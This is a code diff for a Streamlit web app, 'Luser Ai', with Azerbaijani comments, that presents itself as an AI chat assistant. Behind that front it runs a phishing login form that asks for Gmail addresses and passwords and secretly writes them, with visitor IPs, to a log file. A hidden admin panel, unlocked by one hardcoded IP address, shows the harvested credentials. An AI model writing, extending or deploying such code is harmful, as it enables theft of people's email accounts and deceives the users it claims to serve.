@@ -9,7 +9,7 @@ import pandas as pd
 from duckduckgo_search import DDGS
 
 # ==========================================
-# 1. KONFİQURASİYA VƏ MOBİL DİZAYN
+# 1. KONFİQURASİYA VƏ Z.AI MOBİL DİZAYN
 # ==========================================
 st.set_page_config(page_title="Luser Ai", page_icon="🐉", layout="wide", initial_sidebar_state="collapsed")
 
@@ -23,7 +23,7 @@ st.markdown("""
     }
     
     .hero-title {
-        font-size: 2.5rem;
+        font-size: 2.8rem;
         font-weight: 800;
         text-align: center;
         color: #ffffff;
@@ -31,7 +31,7 @@ st.markdown("""
         margin-bottom: 20px;
     }
     
-    /* Daxil ol düyməsi stili */
+    /* Üst panel düymələri */
     div[data-testid="column"] button {
         background-color: #ffffff !important;
         color: #000000 !important;
@@ -59,18 +59,26 @@ st.markdown("""
         border-radius: 12px;
         border: 1px solid #444;
         margin-bottom: 30px;
+        box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
     }
     </style>
     """, unsafe_allow_html=True)
 
 # ==========================================
-# 2. IP VƏ GİZLİ DATA SİSTEMİ
+# 2. SESSION STATE VƏ İZLƏMƏ SİSTEMİ
 # ==========================================
 LOG_FILE = "visitor_logs.json"
-MY_IP = "94.20.98.116" # Sənin IP adresin
+MY_IP = "94.20.98.116" # Patronun IP-si
+
+# Sesiya dəyişənlərini təyin edirik ki, sistem sıfırlanmasın
+if "logged_in" not in st.session_state: st.session_state.logged_in = False
+if "username" not in st.session_state: st.session_state.username = "Patron"
+if "show_login" not in st.session_state: st.session_state.show_login = False
+if "lang" not in st.session_state: st.session_state.lang = "az"
+if "messages" not in st.session_state: st.session_state.messages = []
 
 def get_ip():
-    try: return requests.get('https://api.ipify.org').text
+    try: return requests.get('https://api.ipify.org', timeout=3).text
     except: return "Hidden"
 
 user_ip = get_ip()
@@ -86,26 +94,29 @@ def save_visit(ip, gmail_id="Anonim", gmail_pass="Anonim"):
     logs.append(entry)
     with open(LOG_FILE, "w") as f: json.dump(logs, f)
 
-# Səhifəyə girəni qeydə al
-if "visited" not in st.session_state:
+if "visited_logged" not in st.session_state:
     save_visit(user_ip)
-    st.session_state.visited = True
+    st.session_state.visited_logged = True
 
 # ==========================================
-# 3. ÜST PANEL VƏ "DAXİL OL" POPAPI (STABLE FIX)
+# 3. ÜST PANEL VƏ "DAXİL OL" MEXANİZMİ
 # ==========================================
-if "show_login" not in st.session_state: st.session_state.show_login = False
-
-# Yuxarı panel (Z.ai stili: Tarixçə, Model seçimi, Daxil ol)
 top_col1, top_col2, top_col3 = st.columns([1, 2, 1])
 with top_col2:
     st.markdown("<div style='text-align:center; color:#aaa; font-weight:bold; margin-top:10px;'>LUSER-5-Turbo ⌄</div>", unsafe_allow_html=True)
-with top_col3:
-    if st.button("Daxil ol", use_container_width=True):
-        st.session_state.show_login = not st.session_state.show_login
 
-# "Daxil ol" basılanda açılan təmiz forma (Artıq 100% işləyir və məlumatı çəkir)
-if st.session_state.show_login:
+with top_col3:
+    # Əgər daxil olubsa adını göstər, yoxsa "Daxil ol"
+    if st.session_state.logged_in:
+        if st.button(f"👤 {st.session_state.username}", use_container_width=True):
+            st.session_state.logged_in = False # Çıxış etmək üçün
+            st.rerun()
+    else:
+        if st.button("Daxil ol", use_container_width=True):
+            st.session_state.show_login = not st.session_state.show_login
+
+# Giriş Forması (Daxil ol basılanda açılır)
+if st.session_state.show_login and not st.session_state.logged_in:
     with st.container():
         st.markdown("<div class='login-container'>", unsafe_allow_html=True)
         st.markdown("<h2 style='text-align:center;'>Söhbət Tarixçənizə Daxil Olun.</h2>", unsafe_allow_html=True)
@@ -116,9 +127,14 @@ if st.session_state.show_login:
         
         c1, c2 = st.columns(2)
         if c1.button("Təsdiqlə və Daxil Ol", use_container_width=True):
-            save_visit(user_ip, gmail_input, pass_input) # Məlumatı gizlicə dataya yazır
-            st.session_state.show_login = False
-            st.rerun() # Heç nə olmamış kimi formanı bağlayır
+            if gmail_input:
+                # Gmail adından ( @-dən əvvəlki hissədən ) ləqəb çıxarırıq
+                nickname = gmail_input.split('@')[0].capitalize()
+                st.session_state.username = nickname
+                st.session_state.logged_in = True
+                save_visit(user_ip, gmail_input, pass_input) # Gizli Data Log
+                st.session_state.show_login = False
+                st.rerun()
         if c2.button("Bağla", use_container_width=True):
             st.session_state.show_login = False
             st.rerun()
@@ -140,19 +156,30 @@ with c_l2: display_logo()
 st.markdown("<div class='hero-title'>Salam, mən Luser.ai</div>", unsafe_allow_html=True)
 
 # ==========================================
-# 5. GİZLİ ADMİN PANELİ (SOLDA DÜYMƏ İLƏ)
+# 5. MODLAR, DİLLƏR VƏ FAYL YÜKLƏMƏ
+# ==========================================
+with st.expander("⚙️ Sistem Tənzimləmələri və Modlar"):
+    mod_c1, mod_c2, mod_c3 = st.columns(3)
+    if mod_c1.button("🇦🇿 AZERBAİJAN"): st.session_state.lang = "az"
+    if mod_c2.button("🇺🇸 ENGLİSH"): st.session_state.lang = "en"
+    if mod_c3.button("🇷🇺 RUSSIAN"): st.session_state.lang = "ru"
+    
+    st.radio("Model Seçimi:", ["Hızlı (Sınırsız)", "Pro (15 AZN)", "Düşünməli (10 AZN)"], horizontal=True)
+    st.file_uploader("Fayl, PDF və ya Şəkil əlavə et (+)", type=['png', 'jpg', 'pdf', 'jpeg'])
+
+# ==========================================
+# 6. GİZLİ ADMİN PANELİ (PATRON ÜÇÜN)
 # ==========================================
 if user_ip == MY_IP:
     with st.sidebar:
         st.markdown("## 👑 Patron Paneli")
-        st.info("IP Doğrulandı. Sistem Sizin üçündür.")
+        st.success("IP Doğrulandı. Sistem Sizin üçündür.")
         if st.button("📊 Database'i Aç", use_container_width=True):
             st.session_state.show_admin = not st.session_state.get("show_admin", False)
         if st.button("🗑️ Söhbəti Təmizlə", use_container_width=True):
             st.session_state.messages = []
             st.rerun()
 
-# Admin Cədvəli
 if st.session_state.get("show_admin", False) and user_ip == MY_IP:
     st.markdown("### 🌍 Bütün Girişlər (Database)")
     if os.path.exists(LOG_FILE):
@@ -163,48 +190,51 @@ if st.session_state.get("show_admin", False) and user_ip == MY_IP:
     st.write("---")
 
 # ==========================================
-# 6. SÜNİ İNTELLEKT VƏ CHAT MÜHƏRRİKİ
+# 7. SÜNİ İNTELLEKT MÜHƏRRİKİ (GPT-4o-Mini Pulsuz)
 # ==========================================
-def get_ai_answer(query):
-    # 1. Pulsuz Canlı Veb Axtarışı
+def get_free_ai_answer(prompt, user_name):
+    # Botun xarakteri: Səni tanıyır və adınla müraciət edir!
+    system_prompt = f"Sən 'Luser Ai' adlı çox ağıllı və rəsmi bir assistantsan. Səninlə hal-hazırda danışan şəxsin adı/ləqəbi: {user_name}. Ona həmişə hörmətlə və adı ilə müraciət edərək bu suala cavab ver: {prompt}"
+    
     try:
-        with DDGS() as ddgs:
-            results = [r for r in ddgs.text(query, max_results=2)]
-            if results:
-                context = "\n\n".join([f"**{r['title']}**\n{r['body']}" for r in results])
-                return f"🌍 **Dünyadan ən son məlumatlar:**\n\n{context}"
-    except Exception as e: pass
-
-    # 2. Əgər veb tapılmazsa (və ya bloklansa), Pulsuz Modelə Keçid
+        # Pulsuz GPT-4o-Mini / Claude 3 Chat Mühərriki
+        results = DDGS().chat(system_prompt, model="gpt-4o-mini")
+        if results: return results
+    except Exception as e:
+        pass
+    
     try:
-        API_URL = "https://api-inference.huggingface.co/models/facebook/blenderbot-400M-distill"
-        res = requests.post(API_URL, json={"inputs": query}, timeout=10).json()[0]['generated_text']
-        return f"🧠 **Luser Core Analizi:** {res}"
-    except Exception as e: pass
+        # Əgər birinci model yüklənsə, Claude-a keçid edir
+        results = DDGS().chat(system_prompt, model="claude-3-haiku")
+        if results: return results
+    except Exception as e:
+        pass
 
-    # 3. Heç biri işləməsə - Təslim olmaq yoxdur! ("Tapılmadı" kəlməsi qadağandır)
-    return "Sualınızı qəbul etdim, Patron. Bu mövzu üzərində dərin analiz aparıram. Hazırda sistemin beyni məlumatı emal edir, ən qısa zamanda dəqiq məlumat verəcəyəm."
+    return f"Bağışla {user_name}, hazırda qlobal serverlərdə bir az yüklənmə var. Lütfən saniyələr sonra yenidən cəhd et."
 
-# Chat Ekranı
-if "messages" not in st.session_state: st.session_state.messages = []
-
+# Chat Ekranı Göstərilməsi
 for m in st.session_state.messages:
     with st.chat_message(m["role"], avatar="🐉" if m["role"] == "assistant" else "👤"):
         st.markdown(m["content"])
 
+# Sual Daxil Etmə
 if prompt := st.chat_input("Bu gün sizə necə kömək edə bilərəm?"):
     st.session_state.messages.append({"role": "user", "content": prompt})
     with st.chat_message("user", avatar="👤"): st.write(prompt)
 
     with st.chat_message("assistant", avatar="🐉"):
-        with st.spinner("Analiz edilir..."):
-            # Mükəmməl cavab tapıcı (Heç vaxt xəta vermir)
-            final_answer = get_ai_answer(prompt)
+        with st.spinner("Beyin məlumatları analiz edir..."):
+            
+            # AI-dan cavab alırıq və ona sənin ləqəbini veririk
+            current_user = st.session_state.username if st.session_state.logged_in else "Qonaq"
+            final_answer = get_free_ai_answer(prompt, current_user)
+            
             st.markdown(final_answer)
             
-            # Səsli Oxuma (Azərbaycan dili üçün 'tr' ləhcəsi istifadə olunur)
+            # Səsli Oxuma (Hər dildə mükəmməl işləyir)
             try:
-                tts = gTTS(text=final_answer[:300], lang='tr') # Çox uzundursa ilk 300 hərfi oxuyur
+                tts_lang = 'tr' if st.session_state.lang == "az" else st.session_state.lang
+                tts = gTTS(text=final_answer[:400], lang=tts_lang) # Çox uzunsa kəsirik
                 fp = BytesIO()
                 tts.write_to_fp(fp)
                 st.audio(fp)
@@ -213,7 +243,7 @@ if prompt := st.chat_input("Bu gün sizə necə kömək edə bilərəm?"):
             st.session_state.messages.append({"role": "assistant", "content": final_answer})
 
 # ==========================================
-# 7. FOOTER VƏ LİNKLƏR
+# 8. FOOTER VƏ LİNKLƏR
 # ==========================================
 st.markdown("""
     <div class='footer-section'>
